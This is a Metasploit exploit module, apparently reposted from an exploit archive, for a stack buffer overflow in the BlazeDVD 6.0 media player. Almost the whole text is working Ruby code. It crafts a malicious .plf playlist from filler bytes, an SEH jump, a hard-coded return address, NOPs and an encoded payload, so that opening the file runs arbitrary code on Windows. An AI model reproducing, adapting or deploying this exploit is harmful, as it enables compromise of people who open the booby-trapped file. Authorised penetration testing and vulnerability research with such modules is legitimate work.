BlazeDVD v6.0 Buffer Overflow Exploit (Meta)
============================================


##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
 
include Msf::Exploit::FILEFORMAT
 
def initialize(info = {})
super(update_info(info,
&#039;Name&#039; => &#039;BlazeDVD 6.0 PLF Buffer Overflow&#039;,
&#039;Description&#039; => %q{
This module exploits a stack over flow in BlazeDVD 6.0.
When
the application is used to open a specially crafted plf
file,
a buffer is overwritten allowing for the execution of
arbitrary code.
Set the EXITFUNC to seh or thread for best results.
},
&#039;License&#039; => MSF_LICENSE,
&#039;Author&#039; => [ &#039;Blake&#039; ],
&#039;Version&#039; => &#039;$Revision 1$&#039;,
&#039;References&#039; =>
[
[ &#039;EDB-ID&#039; , &#039;13998&#039; ],
[ &#039;BID&#039;, &#039;35918&#039; ],
],
&#039;DefaultOptions&#039; =>
{
&#039;EXITFUNC&#039; => &#039;process&#039;,
},
&#039;Payload&#039; =>
{
&#039;Space&#039; => 1363,
&#039;BadChars&#039; => "\x00\x0a\x0d",
&#039;DisableNops&#039; => &#039;True&#039;,
},
&#039;Platform&#039; => &#039;win&#039;,
&#039;Targets&#039; =>
[
[ &#039;BlazeDVD 6.0 Universal&#039;, { &#039;Ret&#039; => 0x6033077D } ],
],
&#039;Privileged&#039; => false,
&#039;DisclosureDate&#039; => &#039;June 23, 2010&#039;,
&#039;DefaultTarget&#039; => 0))
 
register_options(
[
OptString.new(&#039;FILENAME&#039;, [ false,
&#039;The file name.&#039;, &#039;msf.plf&#039;]),
], self.class)
 
end
 
def exploit
 
plf = rand_text_alphanumeric(608)
plf << "\xeb\x06\x90\x90"
plf << [target.ret].pack(&#039;V&#039;)
plf << make_nops(20)
plf << payload.encoded
plf << rand_text_alphanumeric(1364 - payload.encoded.length)
 
print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
file_create(plf)
 
end
 
end



